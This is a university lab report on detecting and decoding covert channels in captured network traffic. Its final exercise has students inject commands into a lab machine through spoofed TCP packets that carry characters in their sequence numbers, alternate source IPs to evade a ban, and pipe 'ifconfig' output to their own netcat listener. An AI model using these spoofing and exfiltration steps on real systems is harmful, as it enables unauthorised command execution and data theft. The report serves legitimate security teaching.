\documentclass{article}
\usepackage{geometry}
 \geometry{
 a4paper,
 total={210mm,297mm},
 left=20mm,
 right=20mm,
 top=20mm,
 bottom=20mm,
 }
\usepackage{siunitx} % Provides the \SI{}{} command for typesetting SI units
\usepackage{listings}
\usepackage{graphicx} % Required for the inclusion of images
\usepackage{enumerate}
\usepackage{float}
\setlength\parindent{0pt} % Removes all indentation from paragraphs
\title{\textbf{Lab Exercise: Covert Channels} \\
Network Security - Advanced Topics (VU 389.160) WS 2014/2015 \\
Communication Networks Group at the Institute of Telecommunications \\
Vienna University of Technology } % Title

\author{Simon \textsc{Hellmayr (0825942)}, Peter \textsc{Eder-Neuhauser (1329364)} \\[0.7cm] \LARGE Team: 02} % Author name

\date{\today} % Date for the report
\begin{document}

\maketitle % Insert the title, author and date


%----------------------------------------------------------------------------------------
%	SECTION 1
%----------------------------------------------------------------------------------------
\renewcommand{\arraystretch}{2} %Stretch rows
\section*{Ex. 1.a - Capturing Traffic}
By using ifconfig in the terminal the we found the local IP of the laptop:
\begin{verbatim}
192.168.67.26
\end{verbatim}

\section*{Ex. 1.b - Presumed Perpetrator}
The other other IPs in the network that communicate with 192.168.67.26 are:
\begin{verbatim}
192.168.67.50 (presumably perpetrator) and 192.168.67.1 (presumably router)
\end{verbatim}

\section*{Ex. 1.c - Filter}
The relevant data was filtered by source \& destination IP using wireshark:
\begin{enumerate}
	\item Filter in Wireshark using the command: (ip.src == 192.168.67.50) \&\& (ip.dst == 192.168.67.26)
	\item Export to CSV: team02\_filtered.csv
	\item Converted HEX to decimal via only\_decimal.sh shell script and stored into: team02\_filtered\_dec.csv
\end{enumerate} 

\section*{Ex. 1.d - Rapid Miner \& Discovery by Histogram}
The histogram feature of Rapidminer was used to gain knowledge about the distribution of values in the messages.

\begin{enumerate}
	\item Imported team02\_filtered\_dec.csv into Rapidminer
	\item by using two different fields for the protocols, we can see that all traffic is split up in TCP and UDP. UDP traffic is again split into UDP and NTP
	\item TTL is constant at 64, so there is no entropy to store information
	\item the source port is different for different streams, but not in a way that seems suitable for communication
	\item TCP flags have virtually no distribution
\end{enumerate} 

\section*{Ex. 1.e \& 1.f - Rapid Miner \& Discovery by Scatter Plot}
Using the scatter plot feature of Rapidminer, no meaningful distribution was found, except in the "ip.id" field of the header over the time/packet number. The covert channel was discovered from varying ports on 192.168.67.50 to 192.168.67.26:123 via NTP/UDP.\\

Figure \ref{fig:RMscreen} shows a letter-cloud in the Scatter Plot between the ip.id values 10.000 and 32.500.
\begin{figure}[H] 
	\centering % centering figure 
	%\scalebox{0.5} % rescale the figure by a factor of 0.8 
	{\includegraphics[width=\textwidth]{images/RMscreen.png}} % importing figure
	\caption{Rapidminer Scatter Plot for ip.id} 
	\label{fig:RMscreen} % labeling to refer it inside the text
\end{figure} 

\section*{Ex. 1.g - Deployed Filter}
The deployed Wireshark filter to export the data is as follows:\\
(ip.dst == 192.168.67.26) \&\& (ip.src == 192.168.67.50) \&\& (udp.dstport == 123)

\section*{Ex. 1.h - Decoded Message}
The following steps were used to clean up the information on the subliminal channel and decode the message:

\begin{enumerate}
\item Export only the ip.id field from Wireshark as .csv
\item Open the .csv-File in Sublime Text 3, visually delete all superfluous information and extract only the bytes 4 and 5. 
The string in the Wireshark output file of Line \#1 looks like this:
\begin{verbatim}
"0x7e00 (32256)"
\end{verbatim}

After extracting the information, each line has just two Hex-characters left, exactly the information needed, for example  line \#1:
\begin{verbatim}
7e
\end{verbatim}

\newpage

After deleting the newlines, a string of hexadecimal characters is left:

\begin{verbatim}
7e004e6f7631303a546f6d324a657272792c447374506f72743a3434332c63683a696e54544c73
2c52696768742d4d53420a4e6f7631303a546f6d324a657272792c447374506f72743a3434332c
63683a696e54544c732c52696768742d4d53420a4e6f7631303a546f6d324a657272792c447374
506f72743a3434332c63683a696e54544c732c52696768742d7e004e6f7631303a546f6d324a65
7272792c447374506f72743a3434332c63683a696e54544c732c52696768742d4d53420a4e6f76
31303a546f6d324a657272792c447374506f72743a3434332c63683a696e54544c732c52696768
742d4d53420a4e6f7631303a546f6d324a657272792c447374506f72743a3434332c63683a696e
54544c732c52696768742d7e004e6f7631303a546f6d324a657272792c447374506f72743a3434
332c63683a696e54544c732c52696768742d4d53420a4e6f7631303a546f6d324a657272792c44
7374506f72743a3434332c63683a696e54544c732c52696768742d4d53420a4e6f7631303a546f
6d324a657272792c447374506f72743a3434332c63683a696e54544c732c5269676874
\end{verbatim}

which is a few repetitions of the following string with some newlines and random characters in between:

\begin{verbatim}
4e6f7631303a546f6d324a657272792c447374506f72743a3434332c63683a696e54544c732c52
696768742d4d5342
\end{verbatim}

Alternatively, Matlab or regular expressions could also have been used to filter out the Hex-values.

\item The hint provided in the exercise instructions pointed toward the fact that the encoding used was ASCII/8-Byte Hex. Python provides an easy way to decode this type of information:

\begin{verbatim}
decoded_string = encoded_string.decode("hex")
\end{verbatim}
\end{enumerate}

The decoded message is as follows and refers to another covert channel:
\begin{verbatim}
Nov10:Tom2Jerry,DstPort:443,ch:inTTLs,Right-MSB
\end{verbatim}

Specifically, the message conveys that there will be another covert channel from Tom (leaking machine) to Jerry (malicious laptop) on destination port 443 using the TTL-field, with the most significant bit (MSB) on the right. 



%----------------------------------------------------------------------------------------
%	SECTION 2
%----------------------------------------------------------------------------------------

\newpage
\section*{Ex. 2 - New Covert Channel}
Using the information from the first exercise, our team's pcap file was loaded into Wireshark and all traffic was filtered by destination port 443. Most of the traffic had TTL=64, but two different source IPs (.57, .58) were sending information to destination port 443 with wildly fluctuating TTLs between 37-59. The data was filtered by destination port 443 and source IPs .57 \& .58 and exported as a CSV-file for further analysis:
\begin{enumerate}
\item Scatter plots of TTL over time in Rapid Miner showed that the distribution of values for the TTL looked like some kind of 'symbol-cloud', not unlike the letter-cloud from exercise 1.
\item The tool provided by the tutors was used to analyze the symbol count of the two senders, arriving at approx. 13 and 15 symbols for source IP 57 \& 58 respectively.
\end{enumerate}

At this point, some wrong conclusions were made implying suspicion about the possibility of another covert channel in the IP ID field, encrypted using the TTL-values as key. After reasoning that
\begin{itemize}
\item the data in the IP ID fields appears to be random,
\item there already had already been a covert IP ID channel in exercise 1 and
\item it was unsure whether or not the covert channel in the TTL field was supposed to be human-readable
\end{itemize}
it was concluded that a) sending a key in the same packets would be unwise (which does not imply that it was not an option), and b) the attackers obviously (see Ex.1) violate Kerckhoff's principle and that it would therefore be pragmatic to examine the data in the TTL field by itself. 

\section*{Finding the binary covert channel}
However, all our advances yielded nothing, so we went back to see if we had overlooked some piece of data that could be helpful. Following advice from the tutors, we had another look at the output of the multimodality estimation script:

\begin{verbatim}
         Source		 Packets	 States	        Symbols
 -------------------------------------------------------------- 
 192.168.198.058	    1085	     24	    13.55280957
 192.168.205.001	       3	      1	     1.00000000
 192.168.202.172	      62	      1	     1.00000000
 192.168.198.049	   16909	      2	    	 1.00036268
 192.168.198.057	    1564	     24	    15.38429506
 192.168.205.062	       3	      1	     1.00000000
 192.168.198.001	      14	      1	     1.00000000
 192.168.202.001	      19	      1	     1.00000000
\end{verbatim}

After looking at the traffic in Wireshark and Rapidminer, it was apparent that there was a binary channel from 192.168.198.049 to 192.168.22.2:443 from several source ports, so we filtered the data in Wireshark using the following filter:
\begin{verbatim}
(((((ip.src == 192.168.198.49) && (tcp.dstport == 443))) && (ip.dst == 192.168.22.2))))
\end{verbatim}

Then, as traffic was scattered around many different source ports, we looked at scatter plots of source ports versus packet number (see figures \ref{fig:RMscreen2} and \ref{fig:RMscreen3}). After determining the port in question, we refined our Wireshark filter:
\begin{verbatim}
((((((ip.src == 192.168.198.49) && (tcp.dstport == 443))) && (ip.dst == 192.168.22.2)))) 
&& (tcp.srcport == 51783)
\end{verbatim}

\begin{figure}[H] 
	\centering % centering figure 
	%\scalebox{0.5} % rescale the figure by a factor of 0.8 
	{\includegraphics[width=\textwidth]{images/ex2_scatter_src_no_49_2_wide.png}} % importing figure
	\caption{Rapidminer Scatter Plot for source port vs. packet no for a wide range of packets} 
	\label{fig:RMscreen2} % labeling to refer it inside the text
\end{figure} 
\begin{figure}[H] 
	\centering % centering figure 
	%\scalebox{0.5} % rescale the figure by a factor of 0.8 
	{\includegraphics[width=\textwidth]{images/ex2_scatter_src_no_49_2_tight.png}} % importing figure
	\caption{Rapidminer Scatter Plot for source port vs. packet no, zoomed in on an anomalous burst} 
	\label{fig:RMscreen3} % labeling to refer it inside the text
\end{figure} 


\newpage
\section*{Decoding the binary channel}
We then took the following steps to determine whether this was the traffic we were looking for and tried to decode it:
\begin{itemize}
\item Export TTL values with the filter applied as .csv file to get a list of 56s and 64s.
\item Convert the values to zeros and ones using LibreOffice's spreadsheet program (Excel equivalent) and string the values together to get a bitstring: 
\begin{verbatim}
01111110000000001010111001011100110011100001011010000110101
10110100101100100111000110100000011100101110001000110100001
10001001100000111011101110001101001010111001011100111001100
01101101000011000100110111100101100101000110100000011100101
11001100011010000110110101101010011000110100101011100101110
00100011010000110001011101011011010000110001101000000111001
01110001001110111101100100011010010110011101100101000010101
11001011100110011100001011010000110101101101001011001001110
00110100000011100101110001000110100001100010011000001110111
01110001101001010111001011100111001100011011010000110001001
10111100101100101000110100000011100101110011000110100001101
101011010100110
\end{verbatim}
This binary traffic looks very promising already, because of what looks like a symmetric initialization sequence (01111110) and a buffer before the payload starts (00000000).

\item Reverse the bitorder using Python. Since ASCII encoding has the MSB on the left, but we know from the hint in exercise 2 that it is Right-MSB, we have to reverse the bitorder. We copied the payload into a variable called string and reversed it using string[::-1]
\item Convert this to ASCII using an online decoder. This yields the desired text, but with backwards letter-order
\item To finalize and make it readable, copy back into Python and reverse the symbol-order again to get the "decoded" text:
\end{itemize}

\begin{verbatim}
'u:shamir,p:badpw,u:gladOS,p:cake,u:batma,p:robin u:shamir,p:badpw,u:gladOS,p:cake'
\end{verbatim}

Obviously, this is a list of user/password combinations. 

\newpage
\section*{Ex. 3 - Using Covert Channels}

By looking at the traffic appearing in the Wireshark capture on the second screen, we found that the Jerry's machine has IP address 192.168.67.26, and using ifconfig we determined that our machine has IP 192.168.67.31.

We use the shell to ping the other computer:
\begin{verbatim}
ping 192.168.67.26
\end{verbatim}

The ping attempt clearly showed up on the other machine, as could be seen in Wireshark. However, the ping is not returned. Our conclusion is that some kind of ingress filtering is happening by use of firewall software in the application layer. If the filtering had happened in the network layer, the packet would not have appeared in the Wireshark capture in the first place. 
\\
\section*{Manipulating TCP packets to execute commands}
In order to execute commands on Jerry's computer, spoofed packets were sent to the three web servers using tgn. We used the following commands in the shell (see table for the specific field values):
\begin{verbatim}
team02@ubuntu:~$ sudo tgn -v "ip(src = 192.168.67.26, dst = 192.168.67.220, ttl=64)/
tcp(src = 8888, dst = 80, syn, seq=107)"
Sent 1 packets.
team02@ubuntu:~$ sudo tgn -v "ip(src = 192.168.67.26, dst = 192.168.67.220, ttl=64)/
tcp(src = 8888, dst = 80, syn, seq=114)"
Sent 1 packets.
team02@ubuntu:~$ sudo tgn -v "ip(src = 192.168.67.26, dst = 192.168.67.220, ttl=64)/
tcp(src = 8888, dst = 80, syn, seq=12)"
\end{verbatim}
The option -v outputs the status of the program verbosely, so we can see what happens (whether or not packets have been sent). 


\begin{center}
    \begin{tabular}{ | 1 | l | l | l | 1 | l | l | l | 1 | }
    \hline
    Src. IP & Dst. IP & TTL & Src. Port & Dst. Port & seq & ASCII Dec & ASCII\\ \hline
    192.168.67.26 & 192.168.67.200 & 64 & 8888 & 80 & 107 & 108 & l\\ \hline
    192.168.67.26 & 192.168.67.200 & 64 & 8888 & 80 & 114 & 115 & s\\ \hline
    192.168.67.26 & 192.168.67.200 & 64 & 8888 & 80 & 12 & 13 & [CR] \\ \hline
    \end{tabular}
\end{center}

The ID \& acknowledge sequence values were left out because they weren't needed explicitly and tgn would fill in default values automatically. After experimenting with this functionality, we discovered that IPs would be banned from sending for 120 seconds if they sent more than 10 consecutive packets to the computer.

\section*{Running ifconfig and transferring data to our computer}
First, we set up netcat to listen on port 1024 on our computer using the command:

\begin{verbatim}
netcat -l 1024
\end{verbatim}

The command we would have to execute on the other computer was:

\begin{verbatim}
ifconfig | netcat 192.168.67.31 1024
\end{verbatim}

Then, using the capabilities explored in the previous section, we looked up the decimal values of the ASCII characters of the command, and wrote bash script that executed the command for each character, and added a carriage return in the end to execute the command. In order to avoid being banned by Jerry's computer, the destination IPs, and therefore the spoofed source IPs were alternated for each line. (see the file netcat\_ifconfig.sh in the directory workfiles/Ex3)

\newpage
After running the script we saw the ifconfig information of Jerry's computer appear on our Terminal:

\begin{verbatim}
eth0      Link encap:Ethernet  HWaddr 94:de:80:6f:2e:55  
          inet addr:192.168.67.26  Bcast:192.168.67.255  Mask:255.255.255.0
          inet6 addr: fe80::96de:80ff:fe6f:2e55/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:449738 errors:0 dropped:0 overruns:0 frame:0
          TX packets:301135 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:97545566 (97.5 MB)  TX bytes:39258922 (39.2 MB)
          Interrupt:20 Memory:f3300000-f3320000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:748 errors:0 dropped:0 overruns:0 frame:0
          TX packets:748 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:49180 (49.1 KB)  TX bytes:49180 (49.1 KB)

p3p1      Link encap:Ethernet  HWaddr 94:de:80:6f:2e:45  
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
          Interrupt:19 
\end{verbatim}
\end{document}
